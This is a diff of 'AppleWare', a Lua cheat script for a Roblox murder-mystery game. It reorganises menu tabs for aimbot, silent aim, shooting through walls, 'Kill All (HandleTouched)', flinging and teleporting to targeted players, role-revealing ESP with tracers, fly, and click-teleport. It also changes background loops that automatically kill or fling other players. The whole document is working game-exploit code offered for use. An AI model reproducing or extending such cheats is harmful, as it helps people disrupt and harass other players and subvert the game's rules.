-makeSlider(pages["Combat"], "Y Level (-1 = floor, 0 = middle, 1 = top)", 16, state.magicBulletYLevel or 0, -1, 1, "magicBulletYLevel")
+tgg(pages["Combat"], "Silent Aim Flick (auto-flick camera)", 4, "silentAimFlickToggle")
+addBtn(pages["Combat"], "Flick Shoot Once", 5, flickShoot)
+addSect(pages["Combat"], "Magic Bullet (Shoot Through Walls)", 10)
+tgg(pages["Combat"], "Shoot Through Walls", 11, "shootThroughWall")
+tgg(pages["Combat"], "Auto Shoot Murderer", 12, "autoShootMurderer")
+addBtn(pages["Combat"], "Shoot Murderer Now", 13, fullShootSequence)
+addBtn(pages["Combat"], "Shoot Through Wall (Magic Bullet)", 14, fireThroughWall)
 addSect(pages["Combat"], "Auto Actions", 20)
 tgg(pages["Combat"], "Auto Kill All", 21, "autoKillAll")
 tgg(pages["Combat"], "Loop Fling All", 22, "loopFlingAll")
@@ -2782,30 +2697,27 @@ tgg(pages["Combat"], "Loop Fling Custom", 25, "loopFlingCustom")
 tgg(pages["Combat"], "Auto Reset: Murderer", 26, "autoResetMurderer")
 tgg(pages["Combat"], "Auto Reset: Sheriff", 27, "autoResetSheriff")
 tgg(pages["Combat"], "Auto Reset: Innocent", 28, "autoResetInnocent")
-addSect(pages["Combat"], "Manual Actions", 30)
-addBtn(pages["Combat"], "Fling Murderer Now", 31, flingMurdererNow)
-addBtn(pages["Combat"], "Fling Sheriff Now", 32, flingSheriffNow)
-addBtn(pages["Combat"], "Fling All Now", 33, flingAllNow)
-addBtn(pages["Combat"], "Fling Custom Now", 34, flingCustomNow)
-addBtn(pages["Combat"], "Grab Gun Now", 35, grabGunNow)
-addSect(pages["Combat"], "Kill (HandleTouched)", 50)
-addBtn(pages["Combat"], "Kill All (HandleTouched)", 51, handleTouchKillAll)
-addBtn(pages["Combat"], "Kill Sheriff (HandleTouched)", 52, handleTouchKillSheriff)
-addBtn(pages["Combat"], "Kill Custom (HandleTouched)", 53, handleTouchKillCustom)
-addSect(pages["Combat"], "Aimbot", 90)
-tgg(pages["Combat"], "Aimbot: Murderer", 91, "aimbotMurderer")
-tgg(pages["Combat"], "Aimbot: Sheriff", 92, "aimbotSheriff")
-makeSlider(pages["Combat"], "Aimbot FOV", 93, state.aimbotFOV or 250, 30, 800, "aimbotFOV")
-makeSlider(pages["Combat"], "Aimbot Smoothness", 94, state.aimbotSmooth or 4, 1, 20, "aimbotSmooth")
-tgg(pages["Combat"], "Aimbot Prediction", 95, "aimbotPredict")
-tgg(pages["Combat"], "Aimbot Visibility Check", 96, "aimbotVisCheck")
-tgg(pages["Combat"], "Aimbot Instant Snap", 97, "aimbotSnap")
-tgg(pages["Combat"], "Aimbot Sticky Target", 98, "aimbotSticky")
+addSect(pages["Combat"], "Manual Actions (HandleTouched)", 30)
+addBtn(pages["Combat"], "Kill All (HandleTouched)", 31, killAllNow)
+addBtn(pages["Combat"], "Kill Sheriff (HandleTouched)", 32, killSheriffNow)
+addBtn(pages["Combat"], "Fling Murderer Now", 33, flingMurdererNow)
+addBtn(pages["Combat"], "Fling Sheriff Now", 34, flingSheriffNow)
+addBtn(pages["Combat"], "Fling All Now", 35, flingAllNow)
+addBtn(pages["Combat"], "Grab Gun Now", 36, grabGunNow)
+addSect(pages["Combat"], "Aimbot", 60)
+tgg(pages["Combat"], "Aimbot: Murderer", 61, "aimbotMurderer")
+tgg(pages["Combat"], "Aimbot: Sheriff", 62, "aimbotSheriff")
+makeSlider(pages["Combat"], "Aimbot FOV", 63, state.aimbotFOV or 250, 30, 800, "aimbotFOV")
+makeSlider(pages["Combat"], "Aimbot Smoothness", 64, state.aimbotSmooth or 4, 1, 20, "aimbotSmooth")
+tgg(pages["Combat"], "Aimbot Prediction", 65, "aimbotPredict")
+tgg(pages["Combat"], "Aimbot Visibility Check", 66, "aimbotVisCheck")
+tgg(pages["Combat"], "Aimbot Instant Snap", 67, "aimbotSnap")
+tgg(pages["Combat"], "Aimbot Sticky Target", 68, "aimbotSticky")
 
--- ============ PLAYERS TAB ============
-addSect(pages["Players"], "Add Player (Type Name)", 1)
-makeInput(pages["Players"], 2, "Username or display name...", state.playerSearchText or "", function(t) state.playerSearchText = t end)
-addBtn(pages["Players"], "Add Current Text to Custom List", 3, function()
+-- ============ CUSTOM TAB ============
+addSect(pages["Custom"], "Add Player (Type Name)", 1)
+makeInput(pages["Custom"], 2, "Username or display name...", state.playerSearchText or "", function(t) state.playerSearchText = t end)
+addBtn(pages["Custom"], "Add Current Text to Custom List", 3, function()
     local t = state.playerSearchText or ""
     t = t:gsub("^%s+", ""):gsub("%s+$", "")
     if t == "" then _G.__AW_NOTIFY("Type a name first"); return end
@@ -2818,8 +2730,8 @@ addBtn(pages["Players"], "Add Current Text to Custom List", 3, function()
     if _G.__AW_REFRESH_PLAYER_LIST then pcall(_G.__AW_REFRESH_PLAYER_LIST) end
     if _G.__AW_REFRESH_CUSTOM_LIST then pcall(_G.__AW_REFRESH_CUSTOM_LIST) end
 end)
-addSect(pages["Players"], "Current Custom List", 10)
-customListContainer = Instance.new("Frame", pages["Players"])
+addSect(pages["Custom"], "Current Custom List", 10)
+customListContainer = Instance.new("Frame", pages["Custom"])
 customListContainer.Size = UDim2.new(1, 0, 0, 0)
 customListContainer.AutomaticSize = Enum.AutomaticSize.Y
 customListContainer.LayoutOrder = 11
@@ -2867,7 +2779,15 @@ function refreshCustomListUI()
     end
 end
 _G.__AW_REFRESH_CUSTOM_LIST = refreshCustomListUI
+addSect(pages["Custom"], "Actions", 20)
+addBtn(pages["Custom"], "Kill Custom (HandleTouched)", 21, killCustomNow)
+addBtn(pages["Custom"], "Fling Custom Now", 22, flingCustomNow)
+addBtn(pages["Custom"], "TP to Custom", 23, teleportToCustom)
+addSect(pages["Custom"], "Auto Actions", 30)
+tgg(pages["Custom"], "Loop Fling Custom", 31, "loopFlingCustom")
+refreshCustomListUI()
 
+-- ============ PLAYERS TAB ============
 addSect(pages["Players"], "All Players In Server", 20)
 playerListToggleBtn = addBtn(pages["Players"], "Close Player List", 21, function() end)
 refreshBtn = addBtn(pages["Players"], "Refresh Player List", 22, function() end)
@@ -3009,53 +2929,28 @@ tgg(pages["Teleport"], "Loop TP: Custom", 25, "loopTpCustom")
 -- ============ ESP TAB (UPGRADED) ============
 addSect(pages["ESP"], "Player ESP", 1)
 tgg(pages["ESP"], "Player ESP", 2, "espPlayers")
-tgg(pages["ESP"], "Team Colors (Red/Blue/Green)", 3, "espTeamColor")
-tgg(pages["ESP"], "Highlight (colored body)", 4, "espHighlight")
-tgg(pages["ESP"], "Highlight Outline", 5, "espOutline")
-tgg(pages["ESP"], "Highlight Fill", 6, "espFill")
-tgg(pages["ESP"], "Show Name", 7, "espShowName")
-tgg(pages["ESP"], "Show Role", 8, "espShowRole")
-tgg(pages["ESP"], "Show Distance", 9, "espShowDistance")
-tgg(pages["ESP"], "Tracer Lines", 10, "espTracer")
-addSect(pages["ESP"], "Filters", 20)
-do
-    local filters = {"everyone", "murderer", "sheriff", "hero", "innocent"}
-    local filterNames = {everyone="Everyone", murderer="Murderer Only", sheriff="Sheriff Only", hero="Hero Only", innocent="Innocent Only"}
-    local fBtn = Instance.new("TextButton", pages["ESP"])
-    fBtn.Size = UDim2.new(1, 0, 0, 38)
-    fBtn.LayoutOrder = 21
-    fBtn.BackgroundColor3 = cc3(settingsConfig.cardColor)
-    fBtn.Text = ""
-    fBtn.AutoButtonColor = false
-    Instance.new("UICorner", fBtn).CornerRadius = UDim.new(0, 10)
-    local fLbl = Instance.new("TextLabel", fBtn)
-    fLbl.Size = UDim2.new(1, -12, 1, 0)
-    fLbl.Position = UDim2.new(0, 12, 0, 0)
-    fLbl.BackgroundTransparency = 1
-    fLbl.Text = "ESP Filter: " .. (filterNames[state.espFilter or "everyone"])
-    fLbl.TextColor3 = cc3(settingsConfig.textColor)
-    fLbl.Font = Enum.Font.GothamMedium
-    fLbl.TextSize = 12.5
-    fLbl.TextXAlignment = Enum.TextXAlignment.Left
-    fBtn.MouseButton1Click:Connect(function()
-        local cur = state.espFilter or "everyone"
-        local idx = 1
-        for i, f in ipairs(filters) do if f == cur then idx = i break end end
-        idx = idx % #filters + 1
-        state.espFilter = filters[idx]
-        fLbl.Text = "ESP Filter: " .. filterNames[filters[idx]]
-        saveSettings()
-    end)
-end
-makeSlider(pages["ESP"], "Fill Transparency (0 = opaque)", 22, math.floor((state.espFillTransparency or 0.5)*100), 0, 100, nil, function(v)
+tgg(pages["ESP"], "Team Colors", 3, "espTeamColor")
+addSect(pages["ESP"], "ESP Filters (who to ESP)", 10)
+tgg(pages["ESP"], "Show Murderer", 11, "espMurderer")
+tgg(pages["ESP"], "Show Sheriff", 12, "espSheriff")
+tgg(pages["ESP"], "Show Hero", 13, "espHero")
+tgg(pages["ESP"], "Show Innocent", 14, "espInnocent")
+addSect(pages["ESP"], "ESP Style", 20)
+tgg(pages["ESP"], "Highlight (body glow)", 21, "espHighlight")
+tgg(pages["ESP"], "Highlight Outline", 22, "espOutline")
+tgg(pages["ESP"], "Highlight Fill", 23, "espFill")
+tgg(pages["ESP"], "Show Name", 24, "espShowName")
+tgg(pages["ESP"], "Show Role", 25, "espShowRole")
+tgg(pages["ESP"], "Show Distance", 26, "espShowDistance")
+tgg(pages["ESP"], "Tracer Lines", 27, "espTracer")
+makeSlider(pages["ESP"], "Fill Transparency (0=opaque)", 30, math.floor((state.espFillTransparency or 0.5)*100), 0, 100, nil, function(v)
     state.espFillTransparency = v / 100
     saveSettings()
 end)
-makeSlider(pages["ESP"], "Text Size", 23, state.espTextSize or 14, 8, 30, "espTextSize")
-makeSlider(pages["ESP"], "Max Distance", 24, state.espMaxDistance or 2000, 100, 5000, "espMaxDistance")
-
-addSect(pages["ESP"], "Other ESP", 30)
-tgg(pages["ESP"], "Gun Drop ESP", 31, "espGunDrop")
+makeSlider(pages["ESP"], "Text Size", 31, state.espTextSize or 14, 8, 30, "espTextSize")
+makeSlider(pages["ESP"], "Max Distance", 32, state.espMaxDistance or 2000, 100, 5000, "espMaxDistance")
+addSect(pages["ESP"], "Other ESP", 40)
+tgg(pages["ESP"], "Gun Drop ESP", 41, "espGunDrop")
 
 -- ============ WEBHOOK TAB ============
 tgg(pages["Webhook"], "Auto Send on Timer", 1, "sendOnFull")
@@ -3074,7 +2969,6 @@ tgg(pages["Misc"], "Notify Map Name", 8, "notifyMapName")
 tgg(pages["Misc"], "Round Timer", 9, "showRoundTimerCountdown")
 tgg(pages["Misc"], "Murderer Predictor", 10, "murdererPredictor")
 tgg(pages["Misc"], "Murderer Perk Notify", 11, "murdererPerkNotify")
-tgg(pages["Misc"], "Chat Notify Murderer", 12, "chatNotifyMurderer")
 
 -- ============ VOTING TAB ============
 addSect(pages["Voting"], "Live Vote Map Names", 1)
@@ -3137,7 +3031,7 @@ addBtn(pages["Button"], "Lock All Buttons (still clickable)", 16, function() loc
 addBtn(pages["Button"], "Unlock All Buttons", 17, function() lockAllButtons(false) end)
 do
     local lockBtnId = ""
-    makeInput(pages["Button"], 18, "Button id or label (e.g. killAll / Kill All / bigShootButton)...", "", function(t) lockBtnId = t end)
+    makeInput(pages["Button"], 18, "Button id or label (e.g. killAll / bigShootButton)...", "", function(t) lockBtnId = t end)
     addBtn(pages["Button"], "Lock Certain Button", 19, function() lockButtonCertain(lockBtnId, true) end)
     addBtn(pages["Button"], "Unlock Certain Button", 20, function() lockButtonCertain(lockBtnId, false) end)
 end
@@ -3384,19 +3278,19 @@ tgg(pages["UI"], "Notification Sound", 6, "notifySound")
 tgg(pages["UI"], "Enable Animations", 7, "animationsEnabled")
 
 -- ============ OPEN/CLOSE BUTTON ============
-openBtn = Instance.new("TextButton", sg)
-openBtn.Size = UDim2.new(0,78,0,34)
-openBtn.Position = UDim2.new(state.openX, 0, state.openY, 0)
-openBtn.BackgroundColor3 = cc3(settingsConfig.openBtnColor)
-openBtn.Text = "Close"; openBtn.TextColor3 = cc3(settingsConfig.openBtnTextColor)
-openBtn.Font = Enum.Font.GothamBold; openBtn.TextSize = 12.5
-openBtn.ZIndex = 99999; openBtn.Active = true
-Instance.new("UICorner", openBtn).CornerRadius = UDim.new(0,9)
-openBtnStroke = Instance.new("UIStroke", openBtn)
-openBtnStroke.Color = WHITE; openBtnStroke.Transparency = 0.4; openBtnStroke.Thickness = 1.5
-attachSpinStroke(openBtnStroke, false, {baseThickness = 1.5})
+fb = Instance.new("TextButton", sg)
+fb.Size = UDim2.new(0,78,0,34)
+fb.Position = UDim2.new(state.openX, 0, state.openY, 0)
+fb.BackgroundColor3 = cc3(settingsConfig.openBtnColor)
+fb.Text = "Close"; fb.TextColor3 = cc3(settingsConfig.openBtnTextColor)
+fb.Font = Enum.Font.GothamBold; fb.TextSize = 12.5
+fb.ZIndex = 99999; fb.Active = true
+Instance.new("UICorner", fb).CornerRadius = UDim.new(0,9)
+fbStroke = Instance.new("UIStroke", fb)
+fbStroke.Color = WHITE; fbStroke.Transparency = 0.4; fbStroke.Thickness = 1.5
+attachSpinStroke(fbStroke, false, {baseThickness = 1.5})
 uiOpen = true
-openBtn.MouseButton1Click:Connect(function()
+fb.MouseButton1Click:Connect(function()
     uiOpen = not uiOpen
     if uiOpen then
         mainWrap.Visible = true
@@ -3406,7 +3300,7 @@ openBtn.MouseButton1Click:Connect(function()
         TweenService:Create(mainWrap, TweenInfo.new(0.22, EASE_SOFT, EASE_IN), {Size = UDim2.new(0, 40, 0, 40)}):Play()
         task.delay(0.25, function() if not uiOpen then mainWrap.Visible = false end end)
     end
-    openBtn.Text = uiOpen and "Close" or "Open"
+    fb.Text = uiOpen and "Close" or "Open"
 end)
 
 -- ============ FLY ============
@@ -3505,7 +3399,6 @@ UIS.JumpRequest:Connect(function()
         task.delay(0.15, function() flyUpHold = false end)
     end
 end)
-
 task.spawn(function()
     while true do
         task.wait(0.1)
@@ -3586,41 +3479,27 @@ RunService.RenderStepped:Connect(function()
         c.FieldOfView = savedFOV
     end
 end)
-
--- CLICK TP
-clickTPDebounce = 0
-function tryClickTP()
-    if not state.clickTP then return end
-    if tick() - clickTPDebounce < 0.15 then return end
-    if UIS:GetFocusedTextBox() then return end
-    local c = Workspace.CurrentCamera
-    if not c then return end
-    local m = UIS:GetMouseLocation()
-    local ray = c:ViewportPointToRay(m.X, m.Y)
-    local p = RaycastParams.new()
-    if LP.Character then p.FilterDescendantsInstances = {LP.Character} end
-    p.FilterType = Enum.RaycastFilterType.Exclude
-    local res = Workspace:Raycast(ray.Origin, ray.Direction * 2000, p)
-    local pos = res and res.Position or (ray.Origin + ray.Direction * 60)
-    local r = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
-    if r then
-        r.Anchored = true
-        r.CFrame = CFrame.new(pos + Vector3.new(0, 3, 0))
-        task.wait(0.05)
-        if r.Parent then r.Anchored = false end
-        r.AssemblyLinearVelocity = Vector3.zero
-        r.AssemblyAngularVelocity = Vector3.zero
-        clickTPDebounce = tick()
-    end
-end
 UIS.InputBegan:Connect(function(inp, g)
     if g then return end
     if not state.clickTP then return end
     if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
-        task.spawn(tryClickTP)
+        local c = Workspace.CurrentCamera
+        if not c then return end
+        local m = UIS:GetMouseLocation()
+        local ray = c:ViewportPointToRay(m.X, m.Y)
+        local p = RaycastParams.new()
+        if LP.Character then p.FilterDescendantsInstances = {LP.Character} end
+        p.FilterType = Enum.RaycastFilterType.Exclude
+        local res = Workspace:Raycast(ray.Origin, ray.Direction*2000, p)
+        local pos = res and res.Position or (ray.Origin + ray.Direction*60)
+        local r = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+        if r then
+            r.CFrame = CFrame.new(pos + Vector3.new(0,3,0))
+            r.AssemblyLinearVelocity = Vector3.zero
+            r.AssemblyAngularVelocity = Vector3.zero
+        end
     end
 end)
-
 task.spawn(function()
     local lastTP = 0
     while true do
@@ -3795,24 +3674,6 @@ end)
 task.spawn(function()
     while true do
         task.wait(1)
-        if alive() and not state.xpFarm and isBagFull() then
-            if state.autoKillAll then
-                local knife = findTool("Knife")
-                if knife then
-                    for _, p in ipairs(Players:GetPlayers()) do
-                        if p ~= LP and targetIsAlive(p) and not isWhitelisted(p) then
-                            task.spawn(function() executeHitboxKill(p) end)
-                            task.wait(0.5)
-                        end
-                    end
-                end
-            end
-        end
-    end
-end)
-task.spawn(function()
-    while true do
-        task.wait(1)
         if alive() and isBagFull() and (state.loopFlingAll or state.loopFlingMur or state.loopFlingSheriff or state.loopFlingCustom) then
             if state.loopFlingAll then
                 for _, p in ipairs(Players:GetPlayers()) do
@@ -3858,7 +3719,8 @@ task.spawn(function()
                         if p ~= LP and targetIsAlive(p) then
                             local pr = p.Character and p.Character:FindFirstChild("HumanoidRootPart")
                             if pr and (myRoot.Position - pr.Position).Magnitude <= 8 then
-                                task.spawn(function() executeHitboxKill(p) end)
+                                task.spawn(function() killAllNow() end)
+                                break
                             end
                         end
                     end
@@ -4162,13 +4024,11 @@ getOrCreateEspFolder = function()
 end
 espF = getOrCreateEspFolder()
 espCache, gunDropCache = {}, {}
-espTracers = {}
 function destroyEspEntry(e)
     if not e then return end
     pcall(function()
         if e.hl then e.hl:Destroy() end
         if e.bb then e.bb:Destroy() end
-        if e.tracer then e.tracer:Destroy() end
     end)
 end
 function clearESP(plr)
@@ -4209,24 +4069,16 @@ task.spawn(function()
             for k in pairs(espCache) do espCache[k] = nil end
             gunDropCache = {}
         end
-        -- Cleanup tracers first
-        for plr, tr in pairs(espTracers) do
-            if not tr or not tr.Parent then espTracers[plr] = nil end
-        end
         if not state.espPlayers then
             for p, _ in pairs(espCache) do clearESP(p) end
-            for plr, tr in pairs(espTracers) do
-                pcall(function() tr:Destroy() end)
-                espTracers[plr] = nil
-            end
         else
             for _, p in ipairs(Players:GetPlayers()) do
                 if p ~= LP then
                     local ch = p.Character
                     local hrp = ch and ch:FindFirstChild("HumanoidRootPart")
                     local hum = ch and ch:FindFirstChildOfClass("Humanoid")
-                    local isFiltered = shouldEspPlayer(p)
-                    if ch and hrp and hum and hum.Health > 0 and isFiltered then
+                    local showThis = shouldEspPlayer(p)
+                    if ch and hrp and hum and hum.Health > 0 and showThis then
                         local role = getPlayerRole(p)
                         local col
                         if isInLobby(hrp.Position) then
@@ -4237,7 +4089,7 @@ task.spawn(function()
                         end
                         local head = ch:FindFirstChild("Head") or hrp
                         local e = espCache[p]
-                        if e and (not e.hl or not e.hl.Parent or not e.bb or not e.bb.Parent or e.hl.Adornee ~= ch or e.bb.Adornee ~= head) then
+                        if e and (not e.hl or not e.hl.Parent or not e.bb or not e.bb.Parent or (e.hl and e.hl.Adornee ~= ch) or e.bb.Adornee ~= head) then
                             destroyEspEntry(e); espCache[p] = nil; e = nil
                         end
                         if not e then
@@ -4283,13 +4135,6 @@ task.spawn(function()
                             e.bb.Adornee = head
                             e.bb.MaxDistance = state.espMaxDistance or 2000
                             if e.tx then
-                                local line1 = p.Name
-                                local parts = {}
-                                if state.espShowName then table.insert(parts, p.Name) end
-                                if state.espShowRole then table.insert(parts, "[" .. role .. "]") end
-                                if state.espShowDistance then
-                                    table.insert(parts, "(" .. math.floor((hrp.Position - (LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") and LP.Character.HumanoidRootPart.Position or Vector3.zero)).Magnitude) .. "m)")
-                                end
                                 local text = ""
                                 if state.espShowName then text = p.Name end
                                 if state.espShowRole then text = text .. (text ~= "" and "\n" or "") .. "[" .. role .. "]" end
@@ -4425,4 +4270,3 @@ end)
 
 print("AppleWare fully loaded - made by p04j on discord")
 print("Credits: lzzzx, noir (7yd7)")
-print("ESP upgrades: filter, highlight, outline, fill, show name/role/distance")
